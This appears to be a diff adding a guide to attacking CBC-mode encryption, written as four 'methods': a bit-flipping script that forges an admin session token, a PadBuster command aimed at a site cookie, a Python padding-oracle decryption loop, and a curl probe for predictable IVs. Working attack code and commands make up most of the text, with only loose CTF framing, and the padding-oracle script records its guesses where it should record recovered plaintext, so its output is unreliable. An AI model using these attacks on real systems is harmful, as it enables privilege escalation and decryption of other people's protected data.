@@ -1,1 +1,94 @@
 
+🦹 Method 1: CBC Bit-Flipping Attack (Python/Bash)
+
+Because Plaintext[N] = Decrypt(Ciphertext[N]) XOR Ciphertext[N-1], changing a byte in Ciphertext[0] completely scrambles Plaintext[0] but changes the exact same bit position in Plaintext[1].
+If a session token encodes admin=false across a block boundary, you can alter the preceding block from your terminal to force admin=true.
+bash
+# 1. Convert your hex token into a raw binary file
+echo "414141414141414141414141414141413b61646d696e3d66616c736541414141" | xxd -r -p > token.bin
+
+# 2. Use a Python one-liner to flip the exact bit in the previous block (Block 0) 
+# to change the target byte 'f' (offset 22) to 't' in Block 1
+python3 -c "
+data = bytearray(open('token.bin', 'rb').read())
+# Target position minus 16 bytes (block size) = offset 6
+# XOR out the 'f', XOR in the 't'
+data[6] = data[6] ^ ord('f') ^ ord('t')
+open('modified_token.bin', 'wb').write(data)
+"
+
+# 3. View your new maliciously modified token string
+xxd -p modified_token.bin
+Use code with caution.
+
+🕵️ Method 2: Padding Oracle Attack with PadBuster (Automated Decryption)
+
+If a web server or system decrypts a CBC ciphertext and returns a specific error when the PKCS#7 padding is invalid (e.g., "Invalid Padding"), you can completely decrypt the ciphertext or forge valid encrypted blocks without knowing the key.
+The industry-standard command-line tool for this is PadBuster.
+
+Step 1: Install PadBuster
+
+On Linux/macOS systems, PadBuster is written in Perl and can be cloned or installed via packages:
+bash
+sudo apt install padbuster  # Debian/Ubuntu/Kali
+Use code with caution.
+
+Step 2: Execute automated decryption
+
+Provide the target URL, the encrypted cookie/parameter, block size (usually 16 for AES, 8 for DES), and an authentication mapping flag:
+bash
+padbuster http://vulnerable-site.local "7B2J%2F6x..." 16 -cookies "auth=7B2J%2F6x..."
+Use code with caution.
+PadBuster will sequentially brute-force the padding bytes backwards, printing the plaintext on screen.
+
+🐍 Method 3: Scripted Padding Oracle (Python Automation)
+
+If you are attacking a custom TCP socket, port, or custom API endpoint, you can orchestrate a automated script to handle the byte-by-byte guessing matrix:
+python
+import sys
+# Concept script for custom CTF network endpoints
+# Reconstructs the intermediate state byte-by-byte by tracking valid padding leaks
+
+def test_padding(ciphertext_bytes):
+    # Dummy placeholder function:
+    # Send ciphertext_bytes to server. Return True if valid padding, False if padding error
+    return True 
+
+block_size = 16
+ciphertext = bytes.fromhex("REPLACE_WITH_YOUR_HEX_CIPHERTEXT")
+plaintext = b""
+
+# Process blocks from end to beginning
+for b in range(len(ciphertext) // block_size - 1, 0, -1):
+    c_prev = bytearray(ciphertext[(b-1)*block_size : b*block_size])
+    c_curr = ciphertext[b*block_size : (b+1)*block_size]
+    
+    decrypted_block = bytearray(block_size)
+    
+    # Brute-force block index backwards
+    for i in range(block_size - 1, -1, -1):
+        padding_val = block_size - i
+        
+        # Prep the altered previous ciphertext block tail for targeted padding
+        c_mod = bytearray(c_prev)
+        for k in range(i + 1, block_size):
+            c_mod[k] = c_mod[k] ^ decrypted_block[k] ^ padding_val
+            
+        # Try all 256 byte options
+        for guess in range(256):
+            c_mod[i] = c_prev[i] ^ guess ^ padding_val
+            if test_padding(bytes(c_mod) + c_curr):
+                decrypted_block[i] = guess
+                print(f"Found plaintext byte: {chr(guess)}")
+                break
+Use code with caution.
+
+🛑 Method 4: Exploiting Predictable IVs (BEAST-Style Attacks)
+
+If an application uses a static, predictable, or sequential Initialization Vector (IV) instead of a cryptographically secure random one, an attacker can guess plaintexts by matching block outputs.
+To see if an IV stream is predictable from the command line, log several network handshakes and isolate the first 16 bytes:
+bash
+# Capture and check if IV strings increment sequentially
+curl -sI http://api.local | grep "X-IV:"
+Use code with caution.
+If the IV increments linearly (e.g., 0001, 0002), you can craft a chosen-plaintext block XORed with the difference of the predicted next IV to confirm whether your guess of a secret message block is correct.
